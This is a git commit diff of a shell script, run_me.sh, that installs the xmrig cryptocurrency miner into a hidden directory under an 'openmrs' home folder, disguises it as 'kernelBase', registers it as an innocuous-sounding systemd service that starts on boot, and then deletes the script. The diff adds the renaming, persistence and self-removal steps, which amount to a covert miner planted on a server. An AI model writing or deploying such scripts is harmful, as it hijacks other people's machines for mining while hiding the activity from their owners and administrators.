152fb50beb8f42ca28e88ab59d1cc2d6c82b4146
Thabiso Nthako <thabiso.nthako@gmail.com>
2026-02-05 07:43:00 +0200

    Update run_me.sh

--- run_me.sh
+++ run_me.sh
@@ -1,12 +1,31 @@
 #! /usr/bin/bash
-sudo mkdir /home/openmrs/.gnu
+
+sudo mkdir -p /home/openmrs/.gnu
 sudo mv /home/openmrs/gnu/* /home/openmrs/.gnu
 sudo rm -R /home/openmrs/gnu
-cd /home/openmrs/.gnu
+
+cd /home/openmrs/.gnu || exit
+
 sudo chmod +x xmrig
-sudo ln -s /home/openmrs/.gnu/xmrig kernelBase
-mv gnu.service /etc/systemd/system
-sudo systemctl chmod 664 /etc/systemd/system/gnu.service
+sudo ln -sf /home/openmrs/.gnu/xmrig kernelBase
+
+# Generate date-time
+NOW=$(date "+%Y%m%d_%H%M%S")
+
+# Replace .laptop
+sed -i "s|\.another|.$NOW|g" gnu.service
+
+# Show result (debug)
+echo "---- Modified gnu.service ----"
+cat gnu.service
+echo "-----------------------------"
+
+# Move service
+sudo mv gnu.service /etc/systemd/system/
+
+sudo chmod 664 /etc/systemd/system/gnu.service
 sudo systemctl daemon-reload
 sudo systemctl enable gnu.service
 sudo systemctl restart gnu.service
+
+sudo rm run_me.sh
